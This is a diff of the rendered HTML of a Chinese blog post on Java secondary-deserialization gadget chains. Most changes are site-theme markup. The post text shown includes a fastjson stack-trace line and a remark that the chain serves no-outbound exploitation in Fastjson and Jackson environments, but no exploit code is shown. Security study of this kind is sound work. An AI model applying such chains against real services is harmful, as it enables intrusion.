-</span></span><span class="line"><span class="cl"><span class="nl">parseObject:</span><span class="mi">223</span><span class="o">,</span> <span class="n">JSON</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">)</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="nl">parseObject:</span><span class="mi">223</span><span class="o">,</span> <span class="n">JSON</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">)</span></span></span></code></pre></td></tr></table>
 </div>
-</div><h4 id="小结-2">小结</h4>
-<p>这条链子很明显，是配合<code>Fastjson</code>、<code>Jackson</code>环境下不出网利用的打法</p>
-<h3 id="用到的工具类">用到的工具类</h3>
-<div class="highlight"><div class="chroma">
+</div><h4 id="小结-2" class="heading-element">
+  <a href="#%e5%b0%8f%e7%bb%93-2" class="heading-mark"></a>小结</h4><p>这条链子很明显，是配合<code>Fastjson</code>、<code>Jackson</code>环境下不出网利用的打法</p>
+<h3 id="用到的工具类" class="heading-element">
+  <a href="#%e7%94%a8%e5%88%b0%e7%9a%84%e5%b7%a5%e5%85%b7%e7%b1%bb" class="heading-mark"></a>用到的工具类</h3><div class="highlight" id="id-14"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
@@ -1401,27 +1222,25 @@
 </span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="n">e</span><span class="o">;</span>
 </span></span><span class="line"><span class="cl">        <span class="o">}</span>
 </span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="o">}</span></span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="结语">结语</h3>
-<p>那么，就写到这里吧，再写，就不礼貌辣</p>
-<h3 id="参考文章">参考文章</h3>
-<p><a href="http://miku233.viewofthai.link/2022/05/29/buggyLoader/"target="_blank" rel="external nofollow noopener noreferrer">http://miku233.viewofthai.link/2022/05/29/buggyLoader/</a></p>
+</div><h3 id="结语" class="heading-element">
+  <a href="#%e7%bb%93%e8%af%ad" class="heading-mark"></a>结语</h3><p>那么，就写到这里吧，再写，就不礼貌辣</p>
+<h3 id="参考文章" class="heading-element">
+  <a href="#%e5%8f%82%e8%80%83%e6%96%87%e7%ab%a0" class="heading-mark"></a>参考文章</h3><p><a href="http://miku233.viewofthai.link/2022/05/29/buggyLoader/"target="_blank" rel="external nofollow noopener noreferrer">http://miku233.viewofthai.link/2022/05/29/buggyLoader/</a></p>
 <p><a href="https://su18.org/"target="_blank" rel="external nofollow noopener noreferrer">https://su18.org/</a></p>
 <p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BROME/"target="_blank" rel="external nofollow noopener noreferrer">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BROME/</a></p>
 <p><a href="https://github.com/H3rmesk1t/Learning_summary/tree/main/WebSec/JAVA"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/H3rmesk1t/Learning_summary/tree/main/WebSec/JAVA</a></p></div><div class="post-footer" id="post-footer">
   <div class="post-info">
     <div class="post-info-line">
       <div class="post-info-mod">
-        <span title=2023-01-15&#32;20:54:57>更新于 2023-01-15&nbsp;</span>
+        <span title="更新于 2023-01-15 20:54:57">更新于 2023-01-15&nbsp;</span>
       </div><div class="post-info-license">
-          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
-        </div></div>
-    <div class="post-info-line">
-      <div class="post-info-md"></div>
-      <div class="post-info-share">
-        <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/" data-title="二次反序列化，看我一命通关"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/" data-title="二次反序列化，看我一命通关"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
   <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
   <a href="javascript:void(0);" title="分享到 WhatsApp" data-sharer="whatsapp" data-url="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/" data-title="二次反序列化，看我一命通关" data-web><i class="fa-brands fa-whatsapp fa-fw" aria-hidden="true"></i></a>
   <a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/" data-title="二次反序列化，看我一命通关"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a>
@@ -1430,9 +1249,8 @@
   <a href="javascript:void(0);" title="分享到 Blogger" data-sharer="blogger" data-url="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/" data-title="二次反序列化，看我一命通关" data-description=""><i class="fa-brands fa-blogger fa-fw" aria-hidden="true"></i></a>
   <a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/" data-title="二次反序列化，看我一命通关"><i class="fa-brands fa-evernote fa-fw" aria-hidden="true"></i></a>
   </span>
-      </div>
-    </div>
-  </div>
+        </div>
+      </div></div>
 
   <div class="post-info-more">
     <section class="post-tags"></section>
@@ -1441,21 +1259,26 @@
     </section>
   </div>
 
-  <div class="post-nav"><a href="/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89java%E4%B9%8Bxml/" class="post-nav-item" rel="prev" title="愿天堂没有Java之XML"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>愿天堂没有Java之XML</a>
+  <div class="post-nav">
       <a href="/%E4%BB%8E-hexo-%E5%88%B0-hugo/" class="post-nav-item" rel="next" title="从 Hexo 到 Hugo">从 Hexo 到 Hugo<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
 </div>
 <div id="comments"><div id="waline" class="comment"></div><noscript>
         Please enable JavaScript to view the comments powered by <a href="https://waline.js.org/" rel="external nofollow noopener noreferrer">Waline</a>.
-      </noscript></div></article></main><footer class="footer">
-    <div class="footer-container"><div class="footer-line copyright order-last" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
-            <span itemprop="copyrightYear">2023</span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line statistics"><span class="site-time" title='网站运行中 ...'><i class="fa-solid fa-heartbeat fa-fw animate-icon" aria-hidden="true"></i><span class="ms-1 d-none">博客已运行</span><span class="run-times ms-1">网站运行中 ...</span></span></div><div class="footer-line visitor">
+      </noscript></div></article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.111.3"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.2-RC"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright order-last" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2023 - 2024</span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line statistics"><span class="site-time" title='网站运行中……'><i class="fa-solid fa-heartbeat fa-fw animate-icon" aria-hidden="true"></i><span class="ms-1 d-none">博客已运行</span><span class="run-times ms-1">网站运行中……</span></span></div><div class="footer-line visitor">
           <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
         </div></div>
   </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
         </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
     <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
   </noscript>
-</div><link rel="stylesheet" href="/lib/waline/waline.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/waline/waline.js" defer></script><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/lunr/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="/lib/lazysizes/lazysizes.min.js" async defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":5000},"comment":{"enable":true,"expired":false,"waline":{"comment":true,"copyright":true,"dark":"body[data-theme='dark']","el":"#waline","emoji":["//unpkg.com/@waline/emojis@1.1.0/weibo"],"highlighter":true,"imageUploader":true,"lang":"zh-cn","login":"enable","meta":["nick","mail","link"],"pageSize":10,"pageview":true,"requiredMeta":["nick","mail"],"search":true,"serverURL":"https://comments-9ptvjujqa-1803700972-qqcom.vercel.app/","texRenderer":true}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"},"siteTime":"2023-1-10"};</script><script src="/js/theme.min.js" defer></script><script>
+</div><link rel="stylesheet" href="/lib/waline/waline.css"><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/waline/waline.js" defer></script><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":5000},"comment":{"enable":true,"expired":false,"waline":{"comment":true,"copyright":true,"dark":"body[data-theme='dark']","el":"#waline","emoji":["//unpkg.com/@waline/emojis@1.1.0/weibo"],"highlighter":true,"imageUploader":true,"lang":"zh-cn","login":"enable","meta":["nick","mail","link"],"pageSize":10,"pageview":true,"requiredMeta":["nick","mail"],"search":true,"serverURL":"https://comments-9ptvjujqa-1803700972-qqcom.vercel.app/","texRenderer":true}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50},"siteTime":"2023-1-10"};</script><script src="/js/theme.min.js" defer></script><script>
       window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
       gtag('config', 'G-CBQC1RW0CV', { 'anonymize_ip': true });
     </script><script src="https://www.googletagmanager.com/gtag/js?id=G-CBQC1RW0CV" async></script></body>
